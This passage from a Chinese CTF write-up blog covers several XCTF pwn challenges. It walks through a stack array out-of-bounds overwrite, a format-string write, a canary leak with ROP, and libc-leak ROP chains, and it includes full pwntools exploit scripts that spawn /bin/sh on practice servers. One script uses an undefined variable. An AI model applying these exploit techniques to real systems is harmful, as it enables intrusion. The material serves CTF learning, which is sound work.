<p>3.使用gdb进行动态调试，在存在该漏洞的函数下设置断点。</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105310409.png" alt="image-20210413105310409" style="zoom:67%;">
<p>设置断点为0x8048839观察函数的偏移量。</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105330148.png" alt="image-20210413105330148" style="zoom:67%;">
<p>函数的返回地址为0xf7e1d637</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105439298.png" alt="image-20210413105439298" style="zoom:67%;"> 
<p>查看当我们更改已经数组里的数字时的栈空间</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105513866.png" alt="image-20210413105513866" style="zoom:67%;">
<p>经过检验和计算得到的偏移量为0x84</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/11.png" alt="11"></p>
<p>4.用ida查看发现存在后门函数hackhere，地址为0x0804859B</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105759309.png" alt="image-20210413105759309" style="zoom:67%;">
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105829019.png" alt="image-20210413105829019" style="zoom:67%;">
<p>5．先写出payload脚本将函数的返回地址覆盖为hackhere的函数地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>g_local=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>hackhere = <span class="hljs-number">0x0804859b</span><br>leave_offset = <span class="hljs-number">0x84</span>    <span class="hljs-comment">#偏移量</span><br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">58555</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writebyte</span>(<span class="hljs-params">offset,value</span>):</span>    <span class="hljs-comment">#构造一个函数，方便修改栈里的地址</span><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.recvuntil(<span class="hljs-string">&quot;which number to change:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(offset))           <br>  p.recvuntil(<span class="hljs-string">&quot;new number:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(value))      <span class="hljs-comment">#利用数组越界修改栈中存放的函数返回值地址</span><br><span class="hljs-comment">##def writedword()</span><br>p.recvuntil(<span class="hljs-string">&quot;How many numbers you have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Give me your numbers&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;10&#x27;</span>)<br>writebyte(leave_offset,<span class="hljs-number">0x9b</span>)         <span class="hljs-comment">#题目是32位系统，小端序，高位地址存放在高位，依次写入hackhere的地址</span><br>writebyte(leave_offset+<span class="hljs-number">1</span>,<span class="hljs-number">0x85</span>)<br>writebyte(leave_offset+<span class="hljs-number">2</span>,<span class="hljs-number">0x04</span>)<br>writebyte(leave_offset+<span class="hljs-number">3</span>,<span class="hljs-number">0x08</span>)<br>p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<p>运行之后发现hackhere函数提供的参数并不能拿到sh</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413110309852.png" alt="image-20210413110309852"></p>
<p>此时只能构造ROP链将system函数的参数修改为/sh</p>
<p>首先查询system的plt表地址</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413110412418.png" alt="image-20210413110412418" style="zoom:67%;">
<p>可以看到system的plt表地址为0x08048450</p>
<p>然后查询参数sh的地址</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413110506599.png" alt="image-20210413110506599" style="zoom: 80%;">
<p>参数sh的地址为0x08048987</p>
<p>修改payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>g_local=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>hackhere = <span class="hljs-number">0x0804859b</span><br>sh = <span class="hljs-number">0x08048987</span><br>system =<span class="hljs-number">0x08048450</span><br>leave_offset = <span class="hljs-number">0x84</span>    <span class="hljs-comment">#偏移量</span><br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">59553</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writebyte</span>(<span class="hljs-params">offset,value</span>):</span>    <span class="hljs-comment">#构造一个函数，方便修改栈里的地址</span><br>  p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.recvuntil(<span class="hljs-string">&quot;which number to change:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(offset))           <br>  p.recvuntil(<span class="hljs-string">&quot;new number:&quot;</span>)<br>  p.sendline(<span class="hljs-built_in">str</span>(value))      <span class="hljs-comment">#利用数组越界修改栈中存放的函数返回值地址</span><br><br>p.recvuntil(<span class="hljs-string">&quot;How many numbers you have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Give me your numbers&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;10&#x27;</span>)<br>writebyte(leave_offset,<span class="hljs-number">0x50</span>)         <span class="hljs-comment">#题目是32位系统，小端序，高位地址存放在高位</span><br>writebyte(leave_offset+<span class="hljs-number">1</span>,<span class="hljs-number">0x84</span>)       <span class="hljs-comment">#先写入system的plt表地址</span><br>writebyte(leave_offset+<span class="hljs-number">2</span>,<span class="hljs-number">0x04</span>)<br>writebyte(leave_offset+<span class="hljs-number">3</span>,<span class="hljs-number">0x08</span>)<br>leave_offset+=<span class="hljs-number">8</span>                        <span class="hljs-comment">#跳过ebp</span><br>writebyte(leave_offset,<span class="hljs-number">0x87</span>)         <span class="hljs-comment">#题目是32位系统，小端序，高位地址存放在高位</span><br>writebyte(leave_offset+<span class="hljs-number">1</span>,<span class="hljs-number">0x89</span>)       <span class="hljs-comment">#写入参数sh</span><br>writebyte(leave_offset+<span class="hljs-number">2</span>,<span class="hljs-number">0x04</span>)<br>writebyte(leave_offset+<span class="hljs-number">3</span>,<span class="hljs-number">0x08</span>)<br>p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-string-格式化字符串"><a class="markdownIt-Anchor" href="#攻防世界-pwn-string-格式化字符串"></a> 攻防世界-pwn-string-格式化字符串</h1>
<p>1.首先检查程序保护，发现保护除了PIE都开启了</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113058130.png" alt="image-20210413113058130" style="zoom:67%;">                               
<p>2.用ida打开并分析函数</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113119231.png" alt="image-20210413113119231" style="zoom:67%;">
<p>主函数首先会打印出v4存储的值以及v4+4然后执行sub_400D72(v4)</p>
<p>下面是sub_400D72(v4)</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113159566.png" alt="image-20210413113159566" style="zoom:67%;">
<p>先执行的是sub_400A7D()下图是sub_400A7D()，只能知道当显示So, where you will go?:时我们得输入east才能继续执行下去</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113242197.png" alt="image-20210413113242197" style="zoom:67%;">
<p>再继续观察，发现sub_400CA6(a1)这个函数里有这样一段，如果a1数组的第一个数等于第二个数，那么可以执行外部命令（查找发现这个函数是可以执行shellcode的），传过来的a1数组就是开始的v3数组</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113307543.png" alt="image-20210413113307543" style="zoom:67%;">
<p>然后在sub_400BB9()存在一处格式化字符串漏洞，由之前主函数可以知道v3的第一个数是68，v3[1]是85，要用格式化字符串漏洞让这两个数相等</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113331447.png" alt="image-20210413113331447" style="zoom:67%;">
<p>在And, you wish is:输入1，Your wish is输入aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x查看输出，可以知道之前输入的1在第七个位置是格式化字符串的第七个参数</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113404697.png" alt="image-20210413113404697" style="zoom:67%;">
<p>由于之前输出的secret[0]就是v3第一个数的地址，所以只要用格式化字符串漏洞修改其为85即可，然后输入shellcode（可以使用pwn库的函数自动生成）</p>
<p>所以可以构造payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;48916&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;secret[0] is &#x27;</span>)<br>v3_addr=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">7</span>),<span class="hljs-number">16</span>) <span class="hljs-comment">#接收v3的地址</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;What should your character&#x27;s name be:\n&quot;</span>,<span class="hljs-string">&quot;abab&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;So, where you will go?east or up?:\n&quot;</span>,<span class="hljs-string">&quot;east&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;go into there(1), or leave(0)?:\n&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;\&#x27;Give me an address\&#x27;\n&quot;</span>,<span class="hljs-built_in">str</span>(v3_addr)) <span class="hljs-comment">#第一次发送v3的地址</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">85</span>+<span class="hljs-string">&#x27;%7$n&#x27;</span>   <span class="hljs-comment">#偏移为7，将v3的地址的位置的参数改为85</span><br>p.recvuntil(<span class="hljs-string">&#x27;And, you wish is:/n&#x27;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;I will help you! USE YOU SPELL\n&#x27;</span>)<br>p.sendline(asm(shellcraft.amd64.linux.sh(),arch=<span class="hljs-string">&quot;amd64&quot;</span>))  <span class="hljs-comment">#发送调用/bin/sh的sellcode</span><br>p.interactive()	<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-pwn1-构造rop链泄露put的真实地址"><a class="markdownIt-Anchor" href="#攻防世界-pwn-pwn1-构造rop链泄露put的真实地址"></a> 攻防世界-pwn-pwn1-构造rop链泄露put的真实地址</h1>
<ol>
<li>先检查文件属性</li>
</ol>
<p>​    <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413113958358.png" alt="image-20210413113958358" style="zoom:67%;"></p>
<p>该程序是64位程序，发现保护已经开的很全了</p>
<p>2.用ida观察主函数，发现有个read函数和puts函数可以进行栈溢出</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114030279.png" alt="image-20210413114030279" style="zoom:67%;">
<p>3.观察栈结构，字符串s距离canary的值的偏移为0x90-0x8=0x88</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114130145.png" alt="image-20210413114130145"></p>
<p>所以可以通过put函数将canary显示出来，由于put函数遇到\00会停止输出，调试可以知道，当我们输入a*0x88后再输入回车时，回车的\0A会覆盖掉canary末尾的\00这时就可以输出canary</p>
<p>输入a*0x88不输入\n时的内存数据</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114203956.png" alt="image-20210413114203956" style="zoom:67%;">
<p>Canary的值应该是0x7c5ddb9e9a8a7d00，但是继续运行程序选择“2“调用put函数时不输出canary的值。</p>
<p>输入’0x88’*a+’\n’的内存空间</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114238047.png" alt="image-20210413114238047" style="zoom:67%;">
<p>这时可以正常输出canary的值了，但是末尾的\00会变成\0a，所以接受时要把末尾的\0a修改为\00</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114309571.png" alt="image-20210413114309571"></p>
<p>4.题目给了一个动态链接库，所以我们可以在里面寻找到execve(&quot;/bin/sh&quot;)的地址</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114328650.png" alt="image-20210413114328650" style="zoom:67%;">
<p>随便选择一个0x45216，此题开启了地址随机化，如果想要通过栈溢出运行execve(&quot;/bin/sh&quot;)，就得泄露内存中的基址</p>
<p>5.利用put()函数泄露put()的真实地址，由于是64位程序，首先找到一个pop_rdi,查找可知地址为0x400a93</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413114404796.png" alt="image-20210413114404796" style="zoom:67%;">
<p>64位程序泄露put()真实地址的方式为：p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)，泄露之后就可以使用</p>
<p>由此可以编写payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br> <br>elf = ELF(<span class="hljs-string">&quot;./babystack&quot;</span>)<br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41209&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./babystack&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>execve = <span class="hljs-number">0x45216</span><br>main_addr = <span class="hljs-number">0x400908</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]           <span class="hljs-comment">#获取put的got表地址</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]           <span class="hljs-comment">#获取put的plt表地址</span><br>pop_rdi = <span class="hljs-number">0x0400a93</span><br> <br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendline(payload)                  <span class="hljs-comment">#先输入0x88个a使put()能够泄露出canary的值</span><br> <br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;\n&#x27;</span>)<br> <br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))   <span class="hljs-comment">#因为末尾的\n会覆盖末尾的\00</span><br> <br>payload1 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br> <br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.send(payload1)             <span class="hljs-comment">#泄露出put()的真实地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>puts_addr=u64(p.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))  <span class="hljs-comment">#读取到\x00停止</span><br><br>execve_addr = puts_addr - (libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>] - execve)   <span class="hljs-comment">#使用相对偏移来计算execve的真实地址</span><br><br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> +  p64(execve_addr)  <span class="hljs-comment">#覆盖返回值为execve的真实地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendline(payload2)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-welpwn-泄露write函数地址构建rop链接"><a class="markdownIt-Anchor" href="#攻防世界-pwn-welpwn-泄露write函数地址构建rop链接"></a> 攻防世界-pwn-welpwn-泄露write函数地址构建rop链接</h1>
<p>1.先检查程序，只开启了nx</p>
  <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115205088.png" alt="image-20210413115205088" style="zoom:67%;">                
<p>2.用ida打开程序进行分析，主函数如下</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115228251.png" alt="image-20210413115228251" style="zoom:67%;">
<p>主函数会调用一个叫echo的函数，把输入buf传入，echo函数如下</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115252303.png" alt="image-20210413115252303" style="zoom:67%;">
<p>此函数把传入的字符串依次复制给局部变量s2，直到0停止，注意到这里s2只有16个长度，可能会存在溢出，但是因为这里遇到\00会停止循环，不能直接构造rop链</p>
<p>通过调试，输入24个A的内存空间如下</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115320597.png" alt="image-20210413115320597" style="zoom:67%;">
<p>这两个栈是连续的，可以看成是这样的结构</p>
<p>0x10  s2  A * 16      0x38 buf  A * 8</p>
<p>0x18  s2  A*8       0x40 返回地址？</p>
<p>0x28    返回地址</p>
<p>0x30 buf  A*16</p>
<p>思路：首先我们输入的地址里不能存在\00，否则就不能读入到s2，因为栈是连续的，如果想要执行我们构造的rop链，就得跳过前面输入的0x18个长度的数据，可以寻找一个存在4个pop指令的地址，如下图0x40089c的位置就有4个连续的pop指令</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214630486.png" alt="image-20210413214630486"></p>
<p>这样我们可以构造这样的栈空间,就可以执行我们需要的函数了</p>
<p>0x10  s2  A*16      0x38 buf  A*8</p>
<p>0x18  s2  A*8       0x40 pop_4</p>
<p>0x28    pop_4      0x48 pop_rdi</p>
<p>0x30 buf  A*16      0x50 got</p>
<p>此题我们开始没有给出libc的版本，所以我们先泄露write的地址，先找到一个pop_rdi的地址为0x4008a3</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413115639822.png" alt="image-20210413115639822" style="zoom:67%;">
<p>先写出一个泄露write地址的脚本，便于判断libc版本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41584&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./welpwn&#x27;</span>)  <br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]  <br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_4=<span class="hljs-number">0x40089c</span><br>pop_rdi=<span class="hljs-number">0x4008a3</span><br>main_addr = <span class="hljs-number">0x4007CD</span><br><br>payload1=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_4)+p64(pop_rdi)+p64(write_got)+p64(puts_plt)+p64(main_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Welcome to RCTF\n&quot;</span>,payload1)<br><br>p.recvuntil(<span class="hljs-string">&#x27;\x40&#x27;</span>)  <br><span class="hljs-comment">#泄露write地址  </span><br>write_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%write_addr)<br><br></code></pre></td></tr></table></figure>
<p>得到write的地址为0x7f0e5b3c72b0，用后三位2b0查找libc的版本可以知道是2.23</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214825951.png" alt="image-20210413214825951"></p>
<p>最后构建payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41584&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./welpwn&#x27;</span>)  <br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]  <br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_4=<span class="hljs-number">0x40089c</span><br>pop_rdi=<span class="hljs-number">0x4008a3</span><br>main_addr = <span class="hljs-number">0x4007CD</span><br><br>payload1=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_4)+p64(pop_rdi)+p64(write_got)+p64(puts_plt)+p64(main_addr) <br><span class="hljs-comment">#构建put函数的rop链，泄露write函数的地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;Welcome to RCTF\n&quot;</span>,payload1)<br><br>p.recvuntil(<span class="hljs-string">&#x27;\x40&#x27;</span>)  <br><span class="hljs-comment">#获取write地址  </span><br>write_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%write_addr)<br><br>libc=ELF(<span class="hljs-string">&quot;libc6_2.23.so&quot;</span>)<br>libc_write=libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]   <br>libc_system=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>libc_binsh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><span class="hljs-comment">#获取libc的基地址，用得到的write地址减去libc里write的地址</span><br>libc_base = write_addr - libc_write<br><span class="hljs-comment">#获取system地址  </span><br>system_addr = libc_base + libc_system  <br><span class="hljs-comment">#获取/bin/sh地址  </span><br>binsh_addr = libc_base + libc_binsh  <br><br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)  <br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(pop_24) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)<br><span class="hljs-comment">#构建rop链，执行system（/bin/sh）</span><br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-pwn100-3个参数的万能rop链"><a class="markdownIt-Anchor" href="#攻防世界-pwn-pwn100-3个参数的万能rop链"></a> 攻防世界-pwn-pwn100-3个参数的万能rop链</h1>
<p>1.首先检查程序，只开启了nx保护</p>
<p>​                     <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214930924.png" alt></p>
<p>2.使用ida进行分析</p>
<p>主函数</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214955997.png" alt="image-20210413214955997" style="zoom:67%;">
<p>Sub_40068E()</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215015084.png" alt="image-20210413215015084" style="zoom:67%;">
<p>Sub_40063D()</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215033863.png" style="zoom:67%;">
<p>可以看出这是一个for循环，每次都向v1的位置读取输入1个字节，i不能超过200</p>
<p>这里查看v1的栈空间只有0x40，可以进行栈溢出</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215105959.png" alt="image-20210413215105959" style="zoom:67%;">
<p>再查看函数，存在puts和read，可以进行泄露，由于没有/bin/sh，所以我们得寻找一个数据段进行写入，用gdb查看内存段权限，发现0x00600e10到   0x00601068是可以进行读写的。</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215131810.png" alt="image-20210413215131810" style="zoom:67%;">
<p>然后继续用ida查看此内存段，发现0x00600e10到0x601068处可以进行写入，用ida查看此处，发现在0x601040处有数据段可以使用此地址写入/bin/sh</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215149078.png" alt="image-20210413215149078" style="zoom:67%;">
<p>我们可以使用程序中的read函数进行写入，read函数有3个参数，这时我们需要一个万能的Gadget进行传参，教程如https://xz.aliyun.com/t/5597，如下图，此程序中也存在__libc_csu_init()这样的函数</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215216727.png" alt="image-20210413215216727" style="zoom:67%;">
<p>如图，先从 0x40075A 开始执行，将 rbx/rbp/r12/r13/r14/r15 这六个寄存器全部布置好，再 ret 到 0x400740 ，继续布置 rdx/rsi/rdi，最后通过 call qword ptr[r12+rbx*8] 执行目标函数。</p>
<p>这个通用 Gadget 好用的地方在于，不仅可以通过函数地址的指针（通常会用记录库函数真实地址的 got 表项）来控制目标函数，还可以控制目标函数的最多三个入参（rdi/rsi/rdx）的值。此外，只要设置 rbp=rbx+1而且栈空间足够，这个 Gadget 可以一直循环调用下去。栈的结构类似下图（原网页的图，第一个0x40061A对应该程序的0x40075A，0x400600对应该程序的0x400740.）</p>
